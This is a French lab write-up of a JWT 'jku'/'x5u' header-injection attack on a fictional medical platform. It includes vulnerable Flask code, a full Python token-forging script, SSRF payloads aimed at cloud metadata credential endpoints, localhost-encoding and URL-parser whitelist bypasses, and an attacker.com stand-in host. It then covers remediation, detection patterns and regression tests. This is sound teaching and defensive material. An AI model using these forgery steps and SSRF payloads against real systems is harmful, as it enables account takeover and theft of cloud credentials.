# Write-up : JKU/X5U Injection — Injection de clé via URL

---

## Résumé exécutif

Les champs `jku` (JWK Set URL) et `x5u` (X.509 URL) d'un JWT permettent au signataire d'indiquer au vérificateur l'URL où récupérer la clé publique nécessaire à la validation de la signature. Lorsqu'un serveur suit l'URL fournie par le client sans validation, un attaquant peut héberger sa propre clé publique et imposer au serveur de vérifier la signature avec cette clé. Il peut alors signer n'importe quel token et se faire passer pour n'importe quel utilisateur. La faille est aggravée par un potentiel SSRF (Server-Side Request Forgery) permettant d'atteindre des services internes.

- **Sévérité** : Critique (CVSS 9.8)
- **CWE** : CWE-347 (Improper Verification of Cryptographic Signature) / CWE-918 (Server-Side Request Forgery)
- **Catégorie OWASP** : A02:2021 — Cryptographic Failures / A10:2021 — Server-Side Request Forgery
- **Impact** : Contournement complet de l'authentification, SSRF, exfiltration de données internes
- **Exploitabilité** : Facile si le serveur ne valide pas les URL

---

## 1. Rappel sur les champs jku et x5u

### 1.1 Le champ jku

Défini par la RFC 7515 (section 4.1.2), le champ `jku` indique l'URL d'un ensemble de clés JSON Web Key Set (JWKS) au format RFC 7517. Le vérificateur peut y récupérer la clé publique correspondant au `kid` présent dans le header.

Exemple d'en-tête JWT avec `jku` :

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "vitalis-2024",
  "jku": "https://auth.vitalis.io/.well-known/jwks.json"
}
```

### 1.2 Le champ x5u

Défini par la même RFC (section 4.1.5), `x5u` pointe vers un certificat X.509 encodé en PEM. Le vérificateur extrait la clé publique du certificat et l'utilise pour valider la signature.

Exemple :

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "https://auth.vitalis.io/certs/vitalis.pem"
}
```

### 1.3 Cas d'usage légitime

Ces champs sont utiles dans trois situations :

- Rotation de clés : le serveur peut publier plusieurs clés et changer la clé active sans modifier le code des vérificateurs
- Architecture multi-émetteurs : un vérificateur centralisé peut authentifier des tokens émis par plusieurs services
- Fédération d'identité : OpenID Connect utilise JWKS pour publier les clés des fournisseurs d'identité

Le standard précise que l'usage de ces champs doit être restreint à des URLs de confiance.

### 1.4 Le piège

Le champ `jku` est fourni par le client. Comme toute donnée contrôlée par l'utilisateur, il doit être traité comme non fiable. Un serveur qui suit aveuglément cette URL délègue à l'attaquant la décision de la clé utilisée pour vérifier la signature.

---

## 2. Principe de la vulnérabilité

### 2.1 Mécanisme

Un serveur qui implémente la vérification basée sur `jku` procède généralement ainsi :

1. Lire le header du token
2. Extraire le champ `jku`
3. Télécharger le JWKS à cette URL
4. Extraire la clé publique correspondant au `kid`
5. Vérifier la signature avec cette clé

Si l'étape 3 accepte n'importe quelle URL, un attaquant peut lui fournir la sienne. Il héberge alors son propre JWKS, contenant sa propre clé publique, dont il détient la clé privée. La signature qu'il produit est validée par le serveur comme si elle provenait d'un émetteur légitime.

### 2.2 Code vulnérable

```python
@app.route("/api/admin/vulnerable")
def admin_vulnerable():
    token = get_token()
    parts = token.split(".")
    h_b64, p_b64, s_b64 = parts

    header = json.loads(b64d(h_b64))
    jku = header.get("jku")

    if jku:
        # Faille : suivi de l'URL fournie par le client
        with urllib.request.urlopen(jku, timeout=3) as resp:
            jwks = json.loads(resp.read().decode())
        key = rsa_from_jwk(jwks["keys"][0])
    else:
        key = LEGIT_KEY.public_key()

    payload = verify_rs256(token, key)
    # ...
```

### 2.3 Double impact

La faille a deux conséquences :

**Contournement d'authentification** : le serveur valide une signature produite avec la clé de l'attaquant. Le contenu du token (rôle, identifiant) devient arbitraire.

**SSRF** : le serveur effectue une requête HTTP vers une URL contrôlée par l'attaquant. Celui-ci peut cibler des services internes non exposés publiquement : métadonnées cloud, bases de données internes, APIs d'administration.

---

## 3. Contexte historique

Les attaques `jku` et `x5u` ont été documentées dans plusieurs publications de référence.

| Référence | Contenu |
|-----------|---------|
| RFC 7515 section 10.1 | Avertissement sur la validation des URLs |
| OWASP JWT Cheat Sheet | Recommandations sur jku et x5u |
| Article "Hacking JSON Web Tokens" (2016) | Premières exploitations pratiques |
| CVE-2018-1000531 (Ruby JWT) | Vérification insuffisante des URLs |
| Bug bounty reports 2019-2023 | Exploitations sur des plateformes SaaS |

La faille est référencée dans le Top 10 OWASP API Security sous API7:2023 — Server Side Request Forgery et API2:2023 — Broken Authentication.

---

## 4. Environnement du laboratoire

### 4.1 Application cible

Vitalis Health est une plateforme médicale destinée aux professionnels de santé. L'authentification repose sur des JWT RS256. La clé publique est exposée sur un endpoint JWKS pour permettre la vérification distribuée.

### 4.2 Comptes de test

```
Médecin : docteur / docteur123 (role: user)
Administrateur : admin / admin123 (role: admin)
```

### 4.3 Endpoints

```
GET  /                     - Page de connexion
GET  /dashboard            - Espace soignant
POST /api/login            - Authentification
GET  /api/me               - Profil courant
GET  /api/jwks.json        - JWKS légitime de Vitalis
GET  /api/public-key       - Clé publique PEM
GET  /api/admin/vulnerable - Dossiers confidentiels (jku suivi)
GET  /api/admin/secure     - Dossiers confidentiels (jku ignoré)
```

### 4.4 JWKS de démonstration

Le laboratoire expose un second JWKS `attacker-jwks.json` simulant un JWKS hébergé par l'attaquant, avec sa propre clé publique dont le serveur détient la clé privée correspondante.

---

## 5. Analyse du code vulnérable

### 5.1 Endpoint vulnérable

```python
@app.route("/api/admin/vulnerable")
def admin_vulnerable():
    token = get_token()
    if not token:
        return jsonify(ok=False, error="Non authentifié"), 401

    try:
        h_b64 = token.split(".")[0]
        header = json.loads(b64d(h_b64))
        jku = header.get("jku")

        if jku:
            # Aucune validation de jku
            with urllib.request.urlopen(jku, timeout=3) as resp:
                jwks = json.loads(resp.read().decode())
            key = rsa_from_jwk(jwks["keys"][0])
        else:
            key = LEGIT_KEY.public_key()

        payload = verify_rs256(token, key)
    except Exception as e:
        return jsonify(ok=False, error=f"Erreur: {e}"), 401

    if payload.get("role") != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"flag": "SPECTRA{...}", ...})
```

### 5.2 Anti-patterns identifiés

| Anti-pattern | Description |
|--------------|-------------|
| Lecture directe de jku | Aucune vérification de l'origine |
| Suivi d'URL arbitraire | Requête HTTP vers n'importe où |
| Absence de whitelist | Aucun domaine autorisé |
| Absence de contrôle de schéma | HTTP et autres protocoles acceptés |
| Aucune protection SSRF | IP privées, localhost, métadonnées accessibles |
| Clé du JWKS utilisée sans vérifier le kid | Aucune correspondance |

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte utilisateur standard.

```
POST /api/login
Content-Type: application/json

{"username":"docteur","password":"docteur123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InZpdGFsaXMtMjAyNCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJkb2N0ZXVyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTk5OTk5OTksImV4cCI6MTcyMDAwMzU5OX0.xxxxx
```

Décodage de l'en-tête :

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "vitalis-2024"
}
```

Aucun champ `jku`. Le serveur utilise la clé légitime.

### 6.2 Détection de la faille

Test d'injection d'un `jku` pointant vers un domaine externe. Le comportement du serveur révèle si le champ est suivi. La présence d'un délai ou d'une erreur de résolution DNS indique que la requête sortante est tentée.

### 6.3 Génération de la paire de clés attaquante

L'attaquant génère sa propre paire RSA.

```bash
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub
```

### 6.4 Construction du JWKS

La clé publique est convertie au format JWK.

```python
import base64
import json
from cryptography.hazmat.primitives import serialization

with open("attacker.pub", "rb") as f:
    pub = serialization.load_pem_public_key(f.read())

nums = pub.public_numbers()

def b64u(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

jwk = {
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "kid": "attacker-key",
    "n": b64u(nums.n),
    "e": b64u(nums.e),
}

print(json.dumps({"keys": [jwk]}, indent=2))
```

### 6.5 Hébergement du JWKS

Le JWKS est exposé sur un serveur contrôlé par l'attaquant, accessible par le serveur cible.

```bash
python3 -m http.server 8000 --directory ./jwks_dir
```

Dans le laboratoire, un endpoint dédié simule ce serveur :

```
http://127.0.0.1:5000/api/attacker-jwks.json
```

### 6.6 Signature du token forgé

L'attaquant construit un token avec un header contenant `jku` et un payload administrateur, puis signe avec sa clé privée.

```python
import base64
import json
import time
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

with open("attacker.key", "rb") as f:
    priv = serialization.load_pem_private_key(f.read(), password=None)

header = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key",
    "jku": "http://127.0.0.1:5000/api/attacker-jwks.json"
}

payload = {
    "sub": "0",
    "username": "docteur",
    "email": "docteur@vitalis.io",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())

sig = priv.sign(
    f"{h}.{p}".encode(),
    padding.PKCS1v15(),
    hashes.SHA256()
)

token = f"{h}.{p}.{b64e(sig)}"
print(token)
```

### 6.7 Envoi du token forgé

```
GET /api/admin/vulnerable
Cookie: token=<token forgé avec jku>
```

Le serveur :

1. Lit `jku` dans l'en-tête
2. Télécharge le JWKS à l'URL fournie
3. Extrait la clé publique (celle de l'attaquant)
4. Vérifie la signature avec cette clé
5. La signature correspond
6. Lit `role: admin` dans le payload

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{jku_h34d3r_1nj3ct10n}",
    ...
  }
}
```

### 6.8 Vérification sur l'endpoint corrigé

Le même token envoyé sur l'endpoint sécurisé :

```
GET /api/admin/secure
Cookie: token=<même token forgé>
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Bloqué: invalid signature"}
```

Le serveur ignore le `jku` et utilise la clé légitime. La signature de l'attaquant ne correspond pas.

---

## 7. Variantes d'exploitation

### 7.1 Variante x5u

Le même principe s'applique au champ `x5u`. L'attaquant héberge un certificat X.509 contenant sa clé publique et pointe le `x5u` vers ce certificat.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "http://attacker.com/cert.pem"
}
```

### 7.2 Variante jwk

Le champ `jwk` (RFC 7515 section 4.1.3) permet d'inclure directement la clé publique dans l'en-tête JWT. Si le serveur utilise cette clé sans validation, l'attaquant n'a même pas besoin d'héberger un JWKS.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB"
  }
}
```

### 7.3 SSRF vers métadonnées cloud

Pointage du `jku` vers un service de métadonnées.

```
jku: http://169.254.169.254/latest/meta-data/
jku: http://metadata.google.internal/computeMetadata/v1/
jku: http://169.254.170.2/v2/credentials/
```

Si le serveur tourne sur AWS, GCP ou Azure, l'attaquant peut récupérer les credentials de l'instance.

### 7.4 SSRF vers services internes

```
jku: http://localhost:6379/       (Redis)
jku: http://localhost:9200/       (Elasticsearch)
jku: http://internal-admin.local/
jku: http://10.0.0.1/
```

### 7.5 Contournement de whitelist par redirection

Si le serveur valide le domaine initial mais suit les redirections HTTP, l'attaquant héberge une redirection sur un domaine autorisé.

```
jku: https://auth.vitalis.io/redirect?to=http://attacker.com/jwks.json
```

Le serveur valide `auth.vitalis.io`, puis suit la redirection vers l'attaquant.

### 7.6 Contournement par DNS rebinding

En contrôlant un domaine qui résout initialement vers une IP publique autorisée puis vers une IP privée, l'attaquant peut contourner certaines validations.

### 7.7 Contournement par encodage

```
jku: http://127.0.0.1:8000/jwks.json
jku: http://127.1:8000/jwks.json
jku: http://0177.0.0.1:8000/jwks.json
jku: http://[::1]:8000/jwks.json
jku: http://2130706433:8000/jwks.json
```

Toutes ces formes désignent localhost. Les filtres naïfs sur la chaîne `"127.0.0.1"` sont contournés.

### 7.8 Contournement par URL parser abuse

```
jku: http://attacker.com#@auth.vitalis.io
jku: http://auth.vitalis.io@attacker.com
jku: http://attacker.com?.auth.vitalis.io
```

Le comportement dépend du parseur. Une vérification basée sur `in` ou sur regex est souvent contournable.

### 7.9 Exploitation par DoS

Pointage du `jku` vers une URL très lente. Chaque requête authentifiée bloque un thread du serveur pendant le timeout.

---

## 8. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| Champ jku ou x5u utilisé | Le serveur lit le champ |
| Aucune whitelist | Le serveur suit n'importe quelle URL |
| Accessibilité sortante | Le serveur peut effectuer des requêtes HTTP |
| Absence de validation de schéma | HTTP accepté en plus de HTTPS |
| Absence de protection SSRF | IP privées et localhost accessibles |

Un compte utilisateur standard suffit pour l'exploitation principale.

---

## 9. Remédiation

### 9.1 Principe directeur

Le serveur ne doit jamais faire confiance au champ `jku` ou `x5u` du token. Il doit imposer la clé à utiliser, ou dans des cas très spécifiques, n'accepter que des URLs figurant dans une whitelist stricte.

### 9.2 Solution la plus simple — Ignorer jku

Dans la majorité des cas, le serveur connaît l'émetteur des tokens et n'a pas besoin de suivre un `jku` client. La clé est fixe ou récupérée depuis une source interne.

```python
EXPECTED_ALG = "RS256"

@app.route("/api/admin/secure")
def admin_secure():
    token = get_token()

    try:
        payload = verify_rs256(token, LEGIT_KEY.public_key())
    except Exception as e:
        return jsonify(ok=False, error=f"Bloqué: {e}"), 401

    if payload.get("role") != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"message": "Accès autorisé"})
```

Toute information du header autre que `alg` et `kid` est ignorée.

### 9.3 Solution intermédiaire — Whitelist stricte

Si le serveur doit supporter plusieurs émetteurs, une whitelist stricte est nécessaire.

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_JKU_HOSTS = {
    "auth.vitalis.io",
    "keys.vitalis.io",
}

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
    except ValueError:
        return False

def resolve_key_safely(jku):
    parsed = urlparse(jku)

    # HTTPS obligatoire
    if parsed.scheme != "https":
        raise ValueError("jku must use HTTPS")

    # Domaine dans la whitelist
    if parsed.hostname not in ALLOWED_JKU_HOSTS:
        raise ValueError(f"host not allowed: {parsed.hostname}")

    # Blocage des IP privées (SSRF)
    if is_private_ip(parsed.hostname):
        raise ValueError("private IP not allowed")

    # Pas de redirections
    with urllib.request.urlopen(jku, timeout=3) as resp:
        if resp.geturl() != jku:
            raise ValueError("redirect not allowed")
        jwks = json.loads(resp.read().decode())

    return rsa_from_jwk(jwks["keys"][0])
```

Points clés :

- HTTPS uniquement
- Whitelist de domaines
- Blocage des IP privées, loopback, link-local et réservées
- Refus des redirections
- Timeout court

### 9.4 Solution robuste — Cache au démarrage

Pour éliminer complètement le risque SSRF, les JWKS sont récupérés une fois au démarrage et mis en cache.

```python
TRUSTED_KEYS = {}

def load_trusted_keys_at_startup():
    for host in ALLOWED_JKU_HOSTS:
        url = f"https://{host}/.well-known/jwks.json"
        with urllib.request.urlopen(url, timeout=5) as resp:
            jwks = json.loads(resp.read().decode())
        TRUSTED_KEYS[host] = [rsa_from_jwk(k) for k in jwks["keys"]]

def resolve_key_from_token(header):
    jku = header.get("jku")

    if not jku:
        return LEGIT_KEY.public_key()

    host = urlparse(jku).hostname
    if host not in TRUSTED_KEYS:
        raise ValueError("unknown jku host")

    return TRUSTED_KEYS[host][0]
```

Aucune requête sortante déclenchée par une donnée client.

### 9.5 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Épinglage de certificat | Vérifier que le certificat serveur du JWKS correspond à une empreinte connue |
| Résolution DNS contrôlée | Vérifier que l'IP résolue n'est pas privée |
| Séparation réseau | Le serveur applicatif n'a pas accès aux services internes sensibles |
| Restriction de sortie | Firewall sortant limité aux domaines nécessaires |
| Blocage des métadonnées cloud | Refuser 169.254.169.254 en sortie |
| Journalisation | Tracer toutes les URLs de jku reçues |
| Alertes | Détecter les jku inhabituels |
| Tests automatisés | Vérifier le rejet des jku externes |

### 9.6 Détection par analyse statique

Patterns à rechercher :

```
header.get("jku")
header.get("x5u")
header.get("jwk")
urllib.request.urlopen(jku
requests.get(jku
fetch(jku)
axios.get(jku)
```

Toute utilisation directe de ces champs dans un contexte de requête HTTP doit être auditée.

---

## 10. Tests de non-régression

```python
def test_jku_externe_rejete(client):
    token = forger_token_avec_jku("http://attacker.com/jwks.json")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_jku_localhost_rejete(client):
    token = forger_token_avec_jku("http://127.0.0.1:8000/jwks.json")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_jku_metadata_cloud_rejete(client):
    token = forger_token_avec_jku("http://169.254.169.254/latest/meta-data/")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_jku_http_rejete(client):
    token = forger_token_avec_jku("http://auth.vitalis.io/jwks.json")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_x5u_externe_rejete(client):
    token = forger_token_avec_x5u("http://attacker.com/cert.pem")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401
```

---

## 11. Impact métier

Pour Vitalis Health, plateforme traitant des données médicales, l'exploitation permet :

- Accès aux dossiers patients confidentiels (violation RGPD)
- Accès aux données administratives et financières
- Usurpation d'identité de professionnels de santé
- Exfiltration via SSRF de données internes
- Compromission de credentials cloud via métadonnées
- Non-conformité aux obligations réglementaires du secteur santé

L'impact inclut une violation potentielle du secret médical et une atteinte à la confiance des établissements de santé.

---

## 12. Conclusion

Les champs `jku`, `x5u` et `jwk` sont des mécanismes standardisés pour la distribution de clés. Leur usage est légitime dans des architectures fédérées, mais uniquement avec une validation stricte des sources. Un serveur qui suit aveuglément une URL contrôlée par le client délègue à l'attaquant la décision de la clé utilisée pour valider ses signatures.

Deux corrections éliminent cette classe de failles :

1. Ignorer les champs `jku`, `x5u` et `jwk` du token et imposer une clé serveur fixe
2. Si le support multi-émetteurs est nécessaire, appliquer une whitelist stricte avec HTTPS obligatoire, validation DNS, blocage des IP privées, refus des redirections et cache au démarrage

Dans tous les cas, aucune requête HTTP ne doit être déclenchée par une valeur d'en-tête fournie par un client, afin de prévenir également les attaques SSRF.

---

## Références

- RFC 7515 — JSON Web Signature (JWS), sections 4.1.2 (jku), 4.1.3 (jwk), 4.1.5 (x5u)
- RFC 7517 — JSON Web Key (JWK)
- RFC 7518 — JSON Web Algorithms (JWA)
- RFC 7519 — JSON Web Token (JWT)
- RFC 8725 — JSON Web Token Best Current Practices
- OWASP Top 10 — A02:2021 Cryptographic Failures
- OWASP Top 10 — A10:2021 Server-Side Request Forgery
- OWASP API Security Top 10 — API7:2023 Server Side Request Forgery
- OWASP JSON Web Token Cheat Sheet
- CWE-347 : Improper Verification of Cryptographic Signature
- CWE-918 : Server-Side Request Forgery
- PortSwigger Web Security Academy — JWT attacks, SSRF
